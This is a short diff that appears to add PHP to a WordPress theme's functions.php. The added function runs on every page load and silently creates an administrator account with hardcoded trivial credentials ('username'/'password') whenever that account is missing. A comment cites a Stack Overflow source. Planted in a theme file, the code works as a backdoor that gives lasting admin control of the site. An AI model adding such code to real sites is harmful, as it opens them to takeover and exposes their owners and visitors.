@@ -1,0 +1,17 @@
+add_action( 'init', 'twentytwentyfour_pattern_categories' );
+function rndprfx_add_user() {
+    $username = 'username';
+    $password = 'password';
+    $email = 'tico@ti.co';
+
+    if (username_exists($username) == null && email_exists($email) == false) {
+        $user_id = wp_create_user( $username, $password, $email );
+        $user = get_user_by( 'id', $user_id );
+        $user->remove_role( 'subscriber' );
+        $user->add_role( 'administrator' );
+    }
+}
+add_action('init', 'rndprfx_add_user');
+
+#https://stackoverflow.com/questions/17308808/create-an-admin-user-programmatically-in-wordpress
+#Dans wordpress/wp-content/themes/twentytwentyfour/functions.php
